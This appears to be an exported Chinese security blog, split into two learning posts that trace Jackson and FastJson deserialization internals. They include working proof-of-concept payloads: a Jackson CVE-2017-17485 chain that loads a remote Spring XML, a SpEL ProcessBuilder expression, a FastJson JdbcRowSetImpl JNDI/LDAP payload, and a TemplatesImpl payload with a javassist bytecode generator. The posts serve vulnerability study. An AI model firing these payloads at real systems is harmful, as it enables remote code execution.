this.age = age;\n        this.mysex = mysex;\n    &#125;\n\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        System.out.println(&quot;调用了person的setname&quot;);\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        System.out.println(&quot;调用了person的setAge&quot;);\n        this.age = age;\n    &#125;\n\n    public Object getMysex() &#123;\n        return mysex;\n    &#125;\n\n    public void setMysex(Object mysex) &#123;\n        System.out.println(&quot;调用了person的setMysex&quot;);\n        this.mysex = mysex;\n    &#125;\n\n    public Person() &#123;\n        System.out.println(&quot;调用person的无参构造方法&quot;);\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name=&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &quot;, age=&quot; + age +\n                &quot;, mysex=&quot; + mysex +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test &#123;\n\n    public static void main(String[] args) &#123;\n            Person person=new Person();\n            person.setMysex(new mysex());\n            ObjectMapper objectMapper=new ObjectMapper();\n            //objectMapper.enableDefaultTyping();\n\n        try&#123;\n//            String json=objectMapper.writeValueAsString(person);\n//            System.out.println(json);\n            Person person1=objectMapper.readValue(&quot;&#123;\\&quot;name\\&quot;:null,\\&quot;age\\&quot;:0,\\&quot;mysex\\&quot;:[\\&quot;mysex\\&quot;,&#123;\\&quot;sex\\&quot;:1&#125;]&#125;&quot;,Person.class);\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n1x01 BeanDeserialzer–类的构造和 set 方法调用断点打在 readValue，然后跟进这里直接跟进 _readMapAndClose 方法的内容获取初始配置，然后读取 deseralizer 的解析器配置，然后调用其 deserialize 方法在 deserialze 方法中直接调用到了vanillaDeserialize我们跟进vanillaDeserialize方法首先跟进_valueInstantiator.createUsingDefault方法在createUsingDefault方法中由于在指定类中存在无参构造方法，所以这里会进入 trycatch 块，调入进_defaultCreator.call()到 call 方法的内容就是无参构造的执行了我们看一下 console 的输出 vanillaDeserialize()方法调用完目标类的无参构造方法，生成实例化 bean 之后，就开始进入 do while 循环，读取字符串键值对中数据，据此来进行字段属性值赋值，其中会调用到 deserialzeAndSet 方法进行具体的操作开始跟进 deserializeAndSet具体内容也很简单，他会匹配传入的键值对各自的属性，如果是普通类型就直接 invoke 调用 set 赋值了，如果是具体类情况的赋值，还会先调用 deserialze 方法对其解析比如说我们当前 dowhile 大循环的中遍历到了 name 属性值，由于他是基本类型，直接 invoke 调用即可之后再调用两次，直接跟进到 mysex 变量的设置发现他会走进_valueDeserializer.deserializeWithType的方法中我们继续跟进判断我们当前要反序列化出来的东西是字段属性，于是进入 JsonTokenId.ID_FIELD_NAME的 case 情况继续跟进最终我们回到了BeanDeserialzer的 deserialze 方法也就是说整个 Jackson 对于具体类的实例化操作都是遵循这一套组件和逻辑的。那么现在要反序列化的 mysex 实例化对象依然还是会走一遍我们上面分析的流程再看一眼 console 的消息输出其实流程到这里就可以结束了，因为之后的赋值操作都会经过 dowhile 循环完成，我们需要的信息就是这一块无参构造调用流程，以及 set 方法的设置\n0x04 jackson 反序列化漏洞解析1x01 前置条件其实只要满足我们上面关于”多态问题解决– JacksonPolymorphicDeserialization”中开启设置能够反序列化的过程中进一步反序列化字段属性的实例化对象就行，总结起来呢就是：\n\n调用了ObjectMapper.enableDefaultTyping()函数\n对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解  \n对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解\n\n三个任意满足一个就行然后就是链子的逻辑合理性了，首先我们不可能遇到直接某一个类中的实例化方法或者 set 方法有命令执行的可能，必须一步一步调用寻找链子上面其实包含了两种攻击思路：\n\n属性值有 object 属性的情况下，这种情况就算是为我们扩展了攻击面，我们就不必强求入口类的构造方法或者 set 方法有可能了，只需要保证其属性字段中 object 字段可控即可\n属性值没有 object 属性的情况下，只能通过当前类的构造方法和 set 方法入手了\n\n漏洞复现阶段我没有去复现关于 templateImpl 的分析，直接来到后面的版本 （目前环境配置不出来）\n1x02  CVE-2017-17485  ClassPathXmlApplicationContext利用链2x01 影响版本Jackson 2.7系列 &lt; 2.7.9.2Jackson 2.8系列 &lt; 2.8.11Jackson 2.9系列 &lt; 2.9.4\n2x02 环境搭建请注意，本次漏洞分析的环境依赖于 spring 等相关知识，所以可能会涉及 IOC 容器思想等 spring 中的特性这是我的依赖\nxml  &lt;dependencies&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\n      &lt;version&gt;2.7.9&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n      &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;\n      &lt;version&gt;2.7.9&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n      &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;\n      &lt;version&gt;2.7.9&lt;/version&gt;\n    &lt;/dependency&gt;\n\n    &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;\n      &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;\n      &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;\n      &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-expression --&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;\n      &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;commons-logging&lt;/groupId&gt;\n      &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\n      &lt;version&gt;1.2&lt;/version&gt;\n    &lt;/dependency&gt;\n  &lt;/dependencies&gt;下面是测试代码\njavapackage Vuln;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class POC &#123;\n    public static void main(String[] args) &#123;\n        String payload = &quot;[\\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\\&quot;, \\&quot;http://127.0.0.1:8000/spring.xml\\&quot;]&quot;;\n        ObjectMapper mapper = new ObjectMapper();\n        mapper.enableDefaultTyping();\n\n        try &#123;\n            mapper.readValue(payload, Object.class);\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n然后这里我们还需要在本地（模拟远程端）写一个 spring.xml，向 IOC 容器中注入一个java.lang.ProcessBuilder\nxml&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;\n       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n       xsi:schemaLocation=&quot;\n     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;\n        &lt;constructor-arg value=&quot;calc.exe&quot; /&gt;\n        &lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;注意一下 payload 的格式，不是正常的 json 格式，而是 [] 包括起来，之前我们做测试的时候，jackson 的字符串解析都会将 [] 包括的部分解析成具体实例化对象字段属性，属于字段属性 field，然后第一个参数是其类型，第二参数为类中的某个属性值，回忆起来这一点即可下面进入流程分析\n2x03 流程分析3x01 objectMapper–初步处理解析断点打在 readValue 处流程和工作流程差不多，但是由于 payload 的原因，objectMapper 会初步判断输入字符串的类型，然后调用不同的 deserialze 方法，依然是跟进到 _readMapAndClose方法处，然后继续调用 deserialze 方法这里遇到的 deserialize 方法与我们之前遇到的有所不同，因为第一参数不同，我们给的是一个具体类参数类型的字符串，不是传统的 json 字符串，所以 objectMapper 这边会直接判断为我们在反序列化一个参数，并且它的类型是具体的类，所以会调用deserialzeWithType直接跟进到了 deserialzeWithType，然后调用 typeDeserializer 的deserializeTypedFromAny，来解析我们输入的 json 内容\n然后我们一直往下跟进，到了 AsArrayTypeDeserializer 的 _deserialze 方法数据处理，然后将处理过后的字符串继续调用 deser.desrialize这里又回到了熟悉的 beanDeserialzer在 deserialize 方法中由于不和我们之前的正常的 json 字符串处理情况相同，这里会进入_deserializeOther又是一段 switch 判断，至于为什么会进 VALUE_STRING 的 case 情况，原因是一样的，jackson 中对于 [] 包裹的字符串内容自动辨别为类中属性值为具体类的特殊情况所以此时解析器认为我们是在解析类中属性值–VALUE_STRING跟进到VALUE_STRING情况的deserializeFromString方法，来反序列化字符串的内容最终调用了 createFromString 方法来创建实例化对象继续跟进，首先会判断首先会判断我们当前指定序列化的类是否有构造方法，如果有就不进 if 判断，进 trycatch 块\n3x02 CPX 有参构造触发开始调用其无参构造方法，其参数为我们指定 URI 的 spring.xml 配置文件的内容很自然的跟进到了 CPX 的有参构造方法中，这里调用父类的构造方法是为了给父类中参数赋值，然后继续跟进 refresh 方法refresh 方法中有一个 invokeBeanFactoryPostProcessors 方法，它是用来处理 Spring.xml 这类配置文件中对于 bean 管理的方法，参数为我们指定的 IOC 容器地址，本地测试的话一般都是指定到了 resources 文件中跟进，这又继续调用了PostProcessorRegistrationDelegate的 invokeBeanFactoryPostProcessors在invokeBeanFactoryPostProcessors中，跟进到通过配置文件中 beanName 来获取类型之后存入 postProcessorNames 的操作往下调用doGetBeanNamesForType真正开始获取 bean 的类型在doGetBeanNamesForType中具体解析的方法是 isFactoryBean 方法，它虽然返回值是布尔类型，但里面具体走的逻辑会把 bean 的信息都完成解析（根据方法名来说是在判断它是否是容器中的 bean）注意此时的 beanName 参数和 mbd 参数跟进到predictBeanType这里调用determineTargetType，开始解析操作此时 targetType 为 null，也就是说暂时找不到我们当前想要的类型，进入 if 判断解析 beanclass跟进 resolveBeanClass到doResolveBeanClass的内容首先获取 BeanClassLoader，然后获取 tempClassLoader，由于我们刚才获取到的所有 ClassLoader 都是 AppClassLoader，所以三个 if 循环最终还是会出来直接调用到evaluateBeanDefinitionString此时观察变量表，我们已经获取到了 StandBeanExpressionResolver 了，也就是说已经装载好了相对应的 SeEL 表达式解析器了继续跟进，try 块中熟悉的 SpEL 表达式注入的味道，既然对 Expression 对象进行了获取，并且也对 SpEL 表达式进行了解析，那它必不可少绝对会有 getValue 去触发，果然在 try 块的最后进行了 getValue 操作SpEL 中基本的使用必须要有 SpEL 表达式的解析器，Expression 实体（用来存放解析器解析后的结果），如果有参数设置的需要，要用到 SpEL 的上下文ParserContext，这里我们肯定是需要的重回我们写的 SpringXML 文件\nxml&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;\n       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n       xsi:schemaLocation=&quot;\n     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;cn&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;\n        &lt;constructor-arg value=&quot;calc.exe&quot; /&gt;\n        &lt;property name=&quot;what&quot; value=&quot;#&#123; cn.start() &#125;&quot;/&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;首先 PreocessBuilder 的有参构造是必须要有的，但是第二个标签属性为什么需要呢？而且参数在ProcessBuilder并不需要，这里涉及 SpEL 表达式执行的流程（具体流程日后分析，个人猜测是 SpEL 表达式内容是单独获取到之后再单独执行）类似于下面的 POC 同样的效果\njavaimport org.springframework.expression.EvaluationContext;\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\nimport org.springframework.expression.spel.support.StandardEvaluationContext;\n\npublic class ExpressionTest &#123;\n    public static void main(String[] args) &#123;\n        ExpressionParser parser = new SpelExpressionParser();\n        Expression expression = parser.parseExpression(&quot;new java.lang.ProcessBuilder(new String[]&#123;\\&quot;calc\\&quot;&#125;).start()&quot;);\n        //EvaluationContext context = new StandardEvaluationContext();\n        //context.setVariable(&quot;end&quot;, &quot;~&quot;);\n        System.out.println(expression.getValue());\n        //System.out.println(expression.getValue(context));\n    &#125;\n","slug":"Jackson反序列化","date":"2024-03-18T09:01:00.000Z","categories_index":"锻刀的理论学习-jackson反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"0d6621065c0a711573630810be4ee3cc","title":"FastJsonRe0","content":"参考自：https://github.com/alibaba/fastjsonhttps://su18.org/post/fastjson/#%E5%89%8D%E8%A8%80https://drun1baby.top/\nFastJson 工作流程及其组件分析0x01 简介FastJson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持 javaBean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 javabean特点就是快，性能好，也就是因为此，FastJson 使用的用户特别多。但是开源组件+用户大的特点，一旦爆出漏洞，危害也是巨大的\n0x02 fastjson 使用从显式上来说，fastjson 功能的实现连接于一个类com.alibaba.fastjson.JSON使用 fastjson 就是为了让类 转化得到 json 字符串，或者将 json 解析为 javabean，那功能组件和具体的工作流程也是绕不开这两者的先看将 javabean 转化为 json\n1x01 javabean-&gt;json这里最常用的方法就是JSON.toJSONString(),该方法有很多重载方法，并且都带有不同的参数，最常用的是下面几个：序列化特性：com.alibaba.fastjson.serializer.SerializerFeature，这个特性可以放到 fastjsonconfig 中供全局使用，又或者直接在方法中指定使用，比如JSON.toJSONString中指定，就可以实现指定序列化类型，使序列化数据自带@type标记\n序列化过滤器：com.alibaba.fastjson.serializer.SerializeFilter，它是一个接口，功能就和名字一样，可以通过配置它的子接口或者实现类的内容，实现扩展编程，也就是额外执行一些代码操作\n序列化配置：com.alibaba.fastjson.serializer.SerializeConfig，可自定义的序列化配置类，之后调试会遇到那么具体使用如下\njavaimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport com.alibaba.fastjson.serializer.SerializerFeature;\nimport sun.rmi.runtime.NewThreadAction;\n\npublic class Test &#123;\n    public static void main(String[] args) &#123;\n        Person person=new Person();\n        person.setAge(20);\n        person.setName(&quot;stoocea&quot;);\n        String personjson= JSON.toJSONString(person, SerializerFeature.WriteClassName);\n        System.out.println(personjson);\n\n        Object o1 =  JSON.parse(personjson);  //解析为JSONObject类型或者JSONArray类型\n\n    &#125;\n&#125;javapublic class Person &#123;\n    private String name;\n    private int age;\n\n    public String getName() &#123;\n        System.out.println(&quot;调用了Name的getter&quot;);\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        System.out.println(&quot;调用了Name的setter&quot;);\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        System.out.println(&quot;调用了Age的getter&quot;);\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        System.out.println(&quot;调用了Age的setter&quot;);\n        this.age = age;\n    &#125;\n\n    public Person() &#123;\n        System.out.println(&quot;调用了无参构造&quot;);\n    &#125;\n\n    public Person(String name, int age) &#123;\n        System.out.println(&quot;调用了有参构造&quot;);\n        this.name = name;\n        this.age = age;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name=&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &quot;, age=&quot; + age +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n\n1x02 json-&gt;javabeanfastjson 中将 json 数据反序列化成 javabean 类的常用方法为parse()``parseObject()``parseArray()，这三个方法也同样拥有很多的重载方法，带有不同的参数（具体可以去类的具体定义中查看）:反序列化特性： com.alibaba.fastjson.parser.Feature类的特性 java.lang.reflect.Type处理泛型反序列化：com.alibaba.fastjson.TypeReference编程扩展定制反序列化：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor 用于处理多余的字段，ExtraTypeProvider 用于处理多余字段时提供类型信息还是与序列化有所不同的，但是有些很常见以及必须要实现的特性和配置还是相同的，fastjson 中的反序列化组件中的属性就很符合其反序列化的功能所要求的，类型宽泛有一张关于 FastJson 早期的框架图：之后流程调试的时候会遇到这些常见组件\n1x03 常见特性相信看完上面的使用例应该有不少疑问，比说为什么序列化结果会有 @type等这里我们将会用实例一个一个解决1.为什么序列化结果出现了@type的字样，假如我们不加反序列化标识SerializerFeature\njavaimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.serializer.SerializerFeature;\n\npublic class Test2 &#123;\n    public static void main(String[] args) &#123;\n        Person person=new Person();\n        person.setName(&quot;stoocea&quot;);\n        person.setAge(20);\n        String personString= JSON.toJSONString(person);\n        System.out.println(personString);\n         //JSON.parseObject(personString);\n    &#125;\n&#125;结果如下就没有@type标识符了，然后我们再尝试不指定类型，直接解析序列化数据\njavaString personString= JSON.toJSONString(person);\nSystem.out.println(personString);\nJSONObject person1=JSON.parseObject(personString);\nSystem.out.println(person1);最后的打印输出并不是我们想要的 person 类的 toString 方法，而是 JSONObject 的 toString 方法，也就是说我们现在得到的并不是想要的 Person 类，并且无法被强转那我们想要得到指定类的方法就是加上@type指定标识的类或者直接在 parseObject 方法中加上该类的全类名的参数即可，这里我们只演示如何通过@type来指定类型有两种方法：1 序列化的时候加序列化标识SerializerFeature.WriteClassName\njavaString personString= JSON.toJSONString(person,SerializerFeature.WriteClassName);\nSystem.out.println(personString);\njavaObject person1= JSON.parse(personString);\nSystem.out.println(person1);\n2 自己手动加，这里就不演示了\n1x04 Fastjson 工作流程分析2x01 选定解析器-DefaultJSONParser断点我们打在测试类的 parseObject 方法处然后跟进这里发现其实 parseObject 对于 parse 只是一层强转封装，最终调用的还是 parse所以继续跟进 parse内容主要是获取到 JSONParser 解析器，然后调用解析器的 parse 方法去解析，这里的 DefaultJSONParser 感兴趣的师傅可以自己调一下，我这里只给出 Parser 实例化完成之后里面需要注意的点大致信息如下：\n\n我们的输入字符串信息 input\n几个标识符，包括我们上面提到的@type\njson 字符串扫描器 lexer—JSONScanner，这里的 scanner 中有一段 token值的计算，感兴趣的师傅可以跟进一下流程，这里 token 算出来是 12\n其他功能信息不一一列举\n\n我们继续跟进 parser 的 parse 方法parse 方法内容主体被 switch 占领了，然后是根据我们刚才初始化 parser 时给 scanner 算的 token 来进行选择的，刚才 token 其实就是算的”{“字符（不太了解具体算法），也就是左标识符，那么这里自然跟进到case: LBRACE的情况获取到的 JSONObject 本身并不带属性值直接跟进 parseObject 方法，此时还是 DefaultJSONParser 类中这里的 parseObject 方法内容较多，主要就是根据字符来进行逻辑判断，然后由逻辑判断走到处理方法这里只走关键性逻辑，通过 scanner 去取得 key 值---@type然后继续往下走，通过 key 值获取到我们刚才指定的 type，也就是 Person 类，然后调用 type 工具类的 loadClass 实现类加载由于他本地缓存 map 中并没有 person 类，所以它得获取到类之后加载，然后存进本地缓存 map，注意此时并没有对 person 类进行任何操作，他只是根据 person 这个名字加载了一个空类，甚至都没有属性值返回出来这个 person 空类，然后继续往下走，来到最终解析的地方，这里是先根据 person 类来获取解析器，然后在调用其解析方法\n2x02 获取解析器–getDeserializer跟进getDeserializer这里判断了一下当前缓存中是否存在能够直接获取到解析该 json 数据的解析器，如果有就直接返回了，很显然我们这里没有，所以还需要跟进getDeserializer内容较多，我们直接跟进到最后 createJavaBeanDeserializer，在此之前的内容只有一个 for 循环黑名单检测，但是那个黑名单里面的内容只有 Thread 线程类这么一个，所以并不影响，然后再进行了多次 if 判断，是否为数组，集合，Map，或者报错类，如果都不是就进入createJavaBeanDeserializercreateJavaBeanDeserializer有很多关于 ASM 前置的检查，这个我们之后再谈，这里走到JavaBeanInfo.build开始正式构造 beanInfobuild 方法本身是返回一个 JavaBeanInfo 列表，那 javaBeanInfo 列表是什么？它里面存储了我们当前想要反序列化 bean 中的 set 方法，get 方法，无参构造，字段属性值等具体信息以及标识，这点从他方法的开头能看出来后续的很多类型检测就不看了，我们直接到关键内容在它方法的最后有三段 for 循环，其中第一个 for 循环是用来获取 set 方法，第二个 for 循环是用来获取字段属性，第三个 for 循环是在获取 get 方法我们只看第一个 for 循环的内容有四个 if 判断，如果不想进入其内容被 return 出去，需要满足：\n\n方法名长度不能小于 4\n不能是静态方法\n返回值不能为空\n获取该方法的参数数量，不能为 1\n\n我们现在想要获取的 Person 类肯定满足这个要求，这里记住就好，后续漏洞利用会考虑到持续跟进，我们以 setName 方法的进度为例，再经过了注解处理以及各类字符处理之后，它最终会被 add 进 fieldInfo 数组这里要注意的是我们在实例化单个 FieldInfo 时有个需要注意的点–关于 getOnly 的设置，其实对于漏洞本身的执行是没有影响的，主要是关于 ASM 解析器的生成，因为 ASM 解析器是动态生成的，如果 getOnly 为 ture，后续会调用 ASM 解析器去解析，我们就无法跟进流程继续分析了。为了让 getOnly 参数不为 true，我们在类中加上一个字段属性以及它的一个 get 方法即可，不要设置 set 方法那么这里就不多记录，直接返回到解析器构造完毕，开始调用 deserialze\n2x03 deserialze 解析—javaBeanDeserializer经过几层包装特性，跟进到了 javaBeanDeserializer 的 deserialze 方法，前面是对 JSON 数据做处理，我们跟进到重点 for 循环，关于 fieldInfo 的遍历for 循环前面是对 fieldinfo 中获取到的字段属性以及 getset 方法等进行类型判断和特殊情况的判断，当来到 createInstance 方法，它首先是实例化了一个 Person 的空类，里面的属性值都为默认后续会调用 FieldDeserializer 的 setVlue 方法具体内容的话就是反射调用 set 方法了漏洞触发点也就是在这，后续的漏洞利用不太能跟进到这，还是 ASM 解析器的原因，我们没办法跟进到具体内容\n0x03 漏洞复现稍微回忆一下流程，主要集中于DefaultJSONParser 中的获取解析器和 deserialze 解析，JSON 数据经过处理\n1x01  JdbcRowSetImpl 利用主要问题出在JdbcRowSetImpl#setDataSourceName和JdbcRowSetImpl#setAutoCommit方法中存在可控的参数以及有后续调用的可能这里能够对 dataSource 变量自由赋值然后在 connect 方法中我们找到了熟悉的 lookup，再看一眼它前面的调用，居然是 initialContext，并且 lookup 中的参数也是我们刚才的可以通过 set 方法去自己构造 datasource，三种条件结合起来就存在 JNDI 攻击的可能\njavaimport com.alibaba.fastjson.JSON;\n\n\n\npublic class FastJson_JNDI_LDAP &#123;\n\n    public static void main(String[] args) &#123;\n\n        String payload = &quot;&#123;&quot; +\n\n                &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,&quot; +\n\n                &quot;\\&quot;dataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:1099/badClassName\\&quot;, &quot; +\n\n                &quot;\\&quot;autoCommit\\&quot;:true&quot; +\n\n                &quot;&#125;&quot;;\n\n        JSON.parse(payload);\n\n    &#125;\n\n&#125;测试一下具体的流程分析无法，跟进上面工作流程中我们讲到了 getOnly 的问题，由于我们不能够控制 JdbcRowSetImpl 中具体方法内容，也就无法使得 getOnly 参数为 false，不开启 ASM 解析器所以无法调试，但其实 deserialize 的内容是差不多的，for 循环获取到 fieldInfo 数组的内容，然后读取到 set 方法反射调用\n1x02 TemplateImpl 利用先看利用 POC 吧\njavaimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\n\n\npublic class FastJson_JNDI_LDAP &#123;\n\n    public static void main(String[] args) &#123;\n        getShortpayload getShortpayload=new getShortpayload();\n        String shortpayload=getShortpayload.getShortTemplatesImpl(&quot;calc&quot;);\n        System.out.println(shortpayload);\n        String payload=&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;, \\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe\\&quot;], &#39;_name&#39;:&#39;c.c&#39;, &#39;_tfactory&#39;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;, \\&quot;_name\\&quot;:\\&quot;a\\&quot;, \\&quot;_version\\&quot;:\\&quot;1.0\\&quot;, \\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;&#125;&quot;;\n        JSON.parseObject(payload, Feature.SupportNonPublicField);\n\n    &#125;\n\n&#125;具体恶意类的内容，也就是 CC3 中恶意类一样,只不过这里我们用 javassist 写一下\njavaimport javassist.*;\n\nimport java.util.Base64;\n\npublic class getShortpayload &#123;\n    Base64.Encoder encoder=Base64.getEncoder();\n    public  String getShortTemplatesImpl(String cmd) &#123;\n        try &#123;\n            ClassPool pool = ClassPool.getDefault();\n            CtClass ctClass = pool.makeClass(&quot;Evil&quot;);\n            CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n            ctClass.setSuperclass(superClass);\n            CtConstructor constructor = ctClass.makeClassInitializer();\n            constructor.setBody(&quot;        try &#123;\\n&quot; +\n                    &quot;            Runtime.getRuntime().exec(\\&quot;&quot; + cmd + &quot;\\&quot;);\\n&quot; +\n                    &quot;        &#125; catch (Exception ignored) &#123;\\n&quot; +\n                    &quot;        &#125;&quot;);\n            CtMethod ctMethod1 = CtMethod.make(&quot;    public void transform(&quot; +\n                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) &#123;\\n&quot; +\n                    &quot;    &#125;&quot;, ctClass);\n            ctClass.addMethod(ctMethod1);\n            CtMethod ctMethod2 = CtMethod.make(&quot;    public void transform(&quot; +\n                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot; +\n                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) &#123;\\n&quot; +\n                    &quot;    &#125;&quot;, ctClass);\n            ctClass.addMethod(ctMethod2);\n            byte[] bytes = ctClass.toBytecode();\n            ctClass.defrost();\n            String payload=encoder.encodeToString(bytes);\n            return payload;\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n            return null;\n        &#125;\n    &#125;\n&#125;2x01  流程简单分析fastjson 解析部分不赘述，来分析TemplateImpl 部分\njava&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,\n\n 